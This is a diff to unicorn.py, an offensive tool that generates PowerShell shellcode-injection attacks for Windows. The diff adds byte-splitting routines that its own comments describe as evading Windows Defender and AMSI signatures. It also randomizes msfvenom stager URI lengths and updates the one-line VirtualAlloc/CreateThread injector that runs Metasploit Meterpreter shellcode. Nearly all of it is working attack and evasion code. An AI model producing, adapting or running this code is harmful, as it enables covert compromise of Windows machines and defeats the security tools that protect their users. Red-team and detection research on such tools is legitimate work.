@@ -443,7 +443,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.4.5 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.5 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -486,7 +486,7 @@ def liquify_bytes(bytes, stub):
     match = re.search("0x8b,0x52,0x0c", bytes) # this is the string defender hits on, just need to chunk
     whopper = ""
     if match:
-        goat_romper = generate_random_string(2,4)
+        goat_romper = generate_random_string(2,3)
         whopper = "royalewithcheese" # pulp fiction reference
         bytes = bytes.split(",0x8b,0x52,0x0c,")
         bytes = (bytes[0] + ");$" + goat_romper + "=(0x8b,0x52,0x0c," + bytes[1])
@@ -495,22 +495,69 @@ def liquify_bytes(bytes, stub):
     whopper2 = ""
     match = re.search("0xc7,0xe2", bytes)
     if match:
-        goat_romper2 = generate_random_string(2,4)
+        goat_romper2 = generate_random_string(2,3)
         whopper2 = "royalewithcheese"
         bytes = bytes.split(",0xc7,0xe2,")
         bytes = (bytes[0] + ");$" + goat_romper2 + "=(0xc7,0xe2," + bytes[1])
 
     whopper3 = ""
+    # this is a solo one
     match = re.search("0x8d,0x5d,0x68,0x6e", bytes)
     if match:
-        goat_romper3 = generate_random_string(2,4)
-        goat_romper4 = generate_random_string(2,4)
-        goat_romper5 = generate_random_string(2,4)
+        goat_romper3 = generate_random_string(2,3)
+        goat_romper4 = generate_random_string(2,3)
+        goat_romper5 = generate_random_string(2,3)
         whopper3 = "royalewithcheese"
         bytes = bytes.split("0x8d,0x5d,")
         bytes2 = bytes[1].split("0x68,", 1)
-
         bytes = bytes[0][:-1] + ");$" + goat_romper3 + "=(0x8d,0x5d);" + "$" + goat_romper4 + "=(0x68);" + "$" + goat_romper5 + "=(" + bytes2[1]
+
+    # split again, we can do this all day
+    whopper4 = ""
+    match = re.search("0x07,0xff,0xd5", bytes)
+    if match:
+        goat_romper6 = generate_random_string(2,3)
+        whopper4 = "royalewithcheese"
+        bytes = bytes.split(",0x07,0xff,0xd5,")
+        bytes = (bytes[0] + ",0x07,0xff);$" + goat_romper6 + "=(0xd5," + bytes[1])
+        
+    # split again, we can do this all day
+    whopper5 = ""
+    match = re.search("0x00,0x00,0xe8", bytes)
+    if match:
+        goat_romper7 = generate_random_string(2,3)
+        whopper5 = "royalewithcheese"
+        bytes = bytes.split(",0x00,0x00,0xe8,")
+        bytes = (bytes[0] + ",0x00,0x00);$" + goat_romper7 + "=(0xe8," + bytes[1])
+
+    # split again, we can do this all day
+    whopper6 = ""
+    match = re.search("0xe8,0xb0,0x00,0x00", bytes)
+    if match:
+        goat_romper8 = generate_random_string(2,3)
+        whopper6 = "royalewithcheese"
+        bytes = bytes.split("0xe8,0xb0,0x00,0x00,")
+        bytes = (bytes[0] + "0xe8,0xb0,0x00);$" + goat_romper8 + "=(0x00," + bytes[1])
+
+    # split again, we can do this all day
+    whopper7 = ""
+    match = re.search("0xdb,0x53,0x53,0x53,0x53", bytes)
+    if match:
+        goat_romper9 = generate_random_string(2,3)
+        whopper7 = "royalewithcheese"
+        bytes = bytes.split(",0xdb,0x53,0x53,0x53,0x53,")
+        bytes = (bytes[0] + ");$" + goat_romper9 + "=(0xdb,0x53,0x53,0x53,0x53," + bytes[1])
+        
+    whopper8 = ""
+    # this is a solo one
+    match = re.search("0x6a,0x0a,0x5f", bytes)
+    if match:
+        goat_romper10 = generate_random_string(2,3)
+        goat_romper11 = generate_random_string(2,3)
+        whopper8 = "royalewithcheese"
+        bytes = bytes.split(",0x6a,0x0a,0x5f,")
+        bytes = bytes[0] + ");$" + goat_romper10 + "=(0x6a);" + "$" + goat_romper11 + "=(0x0a,0x5f," + bytes[1]
+
 
     bytes = bytes.split(",")
     counter = 0
@@ -599,6 +646,15 @@ def liquify_bytes(bytes, stub):
         assemble = assemble + " + $" + goat_romper3
         assemble = assemble + " + $" + goat_romper4
         assemble = assemble + " + $" + goat_romper5
+
+    if whopper4 != "": assemble = assemble + " + $" + goat_romper6
+    if whopper7 != "": assemble = assemble + " + $" + goat_romper9
+    if whopper5 != "": assemble = assemble + " + $" + goat_romper7
+    if whopper6 != "": assemble = assemble + " + $" + goat_romper8
+    if whopper8 != "": 
+        assemble = assemble + " + $" + goat_romper10
+        assemble = assemble + " + $" + goat_romper11
+
     if a2 != "": assemble = assemble + " + $" + a2
     if a3 != "": assemble = assemble + " + $" + a3
     if a4 != "": assemble = assemble + " + $" + a4 
@@ -839,7 +895,11 @@ def generate_shellcode(payload, ipaddr, port):
         data = shellcode.replace("\\xURLHERE", url_patched)
 
     else:
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=50 StagerVerifySSLCert=true -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+
+        # gen random number for length
+        uri_length=generate_random_number(3,6)
+
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength={3} StagerVerifySSLCert=true -a x86 --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         data = data.decode("ascii").replace('"\\xfc', '"', 1)
@@ -964,7 +1024,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
     msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -memberDefinition $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.Len -gt 0x$randstack){$gggg=$zzzz.Len};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);while($true){Start-Sleep 60};';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$wwww=Add-Type -member $tttt -Name "%s" -namespace Win32Functions -pass;$zzzz=%s;$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::VirtualAlloc(0,0x$randstack,$gggg,0x40);for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::CreateThread(0,0,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";if([IntPtr]::Size -eq 8){$2222="C:\$4444\syswow64\$4444$2222\v1.0\$2222"};iex " $2222 -e $hhhh -noe"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
@@ -1331,6 +1391,6 @@ except KeyboardInterrupt:
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-except Exception as e:
-    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
-    else: print("[!] Something went wrong, printing the error: " + str(e))
+#except Exception as e:
+#    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+#    else: print("[!] Something went wrong, printing the error: " + str(e))
